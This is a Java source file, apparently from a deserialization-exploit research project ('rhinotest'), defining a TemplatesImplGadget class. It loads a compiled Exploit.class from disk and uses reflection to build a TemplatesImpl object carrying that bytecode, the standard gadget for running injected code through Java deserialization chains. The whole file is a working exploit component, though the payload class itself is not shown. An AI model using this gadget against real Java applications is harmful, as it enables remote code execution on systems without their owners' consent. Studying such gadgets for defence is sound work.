package com.xiang.rhinotest;

import java.io.*;
import java.util.*;
import java.lang.reflect.Constructor;
import org.apache.commons.io.IOUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

public class TemplatesImplGadget {

	public static byte[][] readClass() {
		String path = System.getProperty("user.dir") + "/target/classes/Exploit.class";
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		try {
			IOUtils.copy(new FileInputStream(new File(path)), bos);
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		byte[][] bytes = new byte[1][];
		bytes[0] = bos.toByteArray();
		return bytes;
	}

	public static TemplatesImpl get() throws Exception {
		TemplatesImpl templatesImpl = null;
		Constructor<?>[] cons =  TemplatesImpl.class.getDeclaredConstructors();
		for (Constructor<?> con : cons) {
			Class<?>[] cls = con.getParameterTypes();
			if (cls.length == 5 && cls[0] == byte[][].class) {
				con.setAccessible(true);
				templatesImpl = (TemplatesImpl)con.newInstance(readClass(), "a", new Properties(), 1, new TransformerFactoryImpl());
				break;
			}
		}
		
		return templatesImpl;
	}
}
